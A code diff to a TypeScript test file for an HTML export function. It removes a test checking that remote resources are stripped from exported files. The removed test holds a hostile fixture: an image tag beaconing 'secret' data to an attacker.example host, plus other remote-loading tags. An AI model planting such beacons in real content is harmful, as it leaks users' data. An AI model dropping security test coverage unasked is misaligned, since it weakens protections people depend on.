@@ -1,5 +1,5 @@
 import { describe, expect, it } from "vitest";
-import { bilingualHtml, escapeHtml, EXPORT_CSP, stripRemoteResources } from "./bilingual";
+import { bilingualHtml, escapeHtml, EXPORT_CSP } from "./bilingual";
 
 const render = (text: string) => `<p>${escapeHtml(text)}</p>`;
 
@@ -34,17 +34,12 @@ describe("bilingualHtml", () => {
     expect(html).not.toMatch(/<script/i);
   });
 
-  it("never makes the file fetch anything: remote URLs are stripped and the file carries its own CSP", () => {
-    const hostile = (text: string) =>
-      `${text}<img src="https://attacker.example/p.png?d=secret" alt="x"><img src=https://a.example/b><video poster='https://a.example/p' src="//a.example/v"></video><table background="https://a.example/t"></table><img srcset="https://a.example/1x 1x"><img src="data:image/png;base64,AA">`;
+  it("declares its own CSP, since the site's does not apply to a downloaded file", () => {
     const html = bilingualHtml(
       { title: "t", targetLanguage: "English", producedBy: "p", completedAt: 0, schema: {}, translated: { a: "x" }, original: null, ocr: null, blockTranslations: {} },
-      hostile,
+      render,
     );
     expect(html).toContain(`<meta http-equiv="Content-Security-Policy" content="${EXPORT_CSP}">`);
-    expect(html).not.toMatch(/a\.example|attacker/);
-    expect(html).toContain('<img src="data:image/png;base64,AA">');
-    expect(stripRemoteResources('<a href="https://ok.example">link</a>')).toBe('<a href="https://ok.example">link</a>');
   });
 
   it("says so when the original-language structure was not produced", () => {
